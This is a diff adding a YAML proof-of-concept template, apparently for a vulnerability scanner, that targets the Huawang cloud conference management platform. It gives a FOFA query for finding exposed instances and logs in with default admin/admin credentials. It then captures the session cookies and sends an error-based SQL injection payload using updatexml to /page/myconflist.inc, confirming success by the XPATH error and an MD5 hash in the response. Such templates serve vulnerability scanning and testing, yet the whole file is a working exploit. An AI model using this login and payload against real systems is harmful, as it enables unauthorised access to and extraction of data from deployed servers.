@@ -1,0 +1,26 @@
+id: poc-yaml-hwactive-myconflist-inc-sqli
+info:
+  name: 华望云会议管理平台 myconflist.inc SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 华望云会议管理平台
+  fofa: title="华望云会议管理平台"
+requests:
+- method: POST
+  path: /ajax/userlogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
+  expression: status_code == 200 && contains(body,"\"success\":true")
+  output:
+  - regex_match(headers,"uid=(?P<uid>.*?);")
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: GET
+  path: /page/myconflist.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5(1))),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&selectTime=1
+  headers:
+    Cookie: uid={{.uid}}; JSESSIONID={{.cookie}}
+  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,"java.sql.SQLException")
+    && contains(body,"c4ca4238a0b923820dcc509a6f75849b")
+variables: {}
+transport: http
